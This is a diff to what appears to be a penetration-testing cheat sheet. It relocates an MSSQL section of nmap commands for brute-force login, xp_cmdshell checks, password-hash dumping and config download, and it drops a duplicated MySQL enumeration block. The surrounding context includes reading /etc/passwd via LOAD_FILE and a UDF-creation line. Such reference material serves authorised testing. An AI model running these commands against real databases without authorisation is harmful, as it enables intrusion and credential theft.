@@ -40,55 +40,6 @@ nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=password
 nmap -p 3306 --script mysql-sql-injection <target>
 ```
 
-
-## MSSQL
-
-```bash
-# Basic MSSQL detection & version
-nmap -p 1433 --script ms-sql-info <target>
-
-# Full MSSQL enumeration
-nmap -p 1433 --script ms-sql-* <target>
-
-# MSSQL user enumeration
-nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>
-
-# Database enumeration
-nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>
-
-# Brute force login
-nmap -p 1433 --script ms-sql-brute --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>
-
-# XP_CMDSHELL execution check (pre-auth)
-nmap -p 1433 --script ms-sql-xp-cmdshell <target>
-
-# Dump hashes (if creds available)
-nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlpassword='pass' <target>
-
-# Config backup download
-nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'
-```
-
-## MySQL Exploitation Commands
-```bash
--- Current user & privileges
-SELECT user(), current_user(), @@version;
-SHOW GRANTS FOR CURRENT_USER();
-
--- All users & hosts
-SELECT user, host, account_locked FROM mysql.user;
-SELECT user,host FROM mysql.user WHERE User NOT LIKE '%mysql.sys';
-
--- Databases & tables
-SHOW DATABASES;
-USE <dbname>; SHOW TABLES;
-SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
-
--- Processes
-SHOW PROCESSLIST;
-SELECT * FROM information_schema.processlist WHERE user != 'system user';
-
-```
 ## MySQL Exploitation Commands
 ```bash
 -- Current user & privileges
@@ -178,6 +129,37 @@ mysql -u root -p -h target -e "SELECT 'CREATE TABLE IF NOT EXISTS udf (a int) EN
 # File read
 mysql -u root -p -h target -e "SELECT LOAD_FILE('/etc/passwd');"
 ```
+
+
+## MSSQL
+
+```bash
+# Basic MSSQL detection & version
+nmap -p 1433 --script ms-sql-info <target>
+
+# Full MSSQL enumeration
+nmap -p 1433 --script ms-sql-* <target>
+
+# MSSQL user enumeration
+nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>
+
+# Database enumeration
+nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>
+
+# Brute force login
+nmap -p 1433 --script ms-sql-brute --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>
+
+# XP_CMDSHELL execution check (pre-auth)
+nmap -p 1433 --script ms-sql-xp-cmdshell <target>
+
+# Dump hashes (if creds available)
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlpassword='pass' <target>
+
+# Config backup download
+nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'
+```
+
+
 
 ## MSSQL Exploitation Commands
 
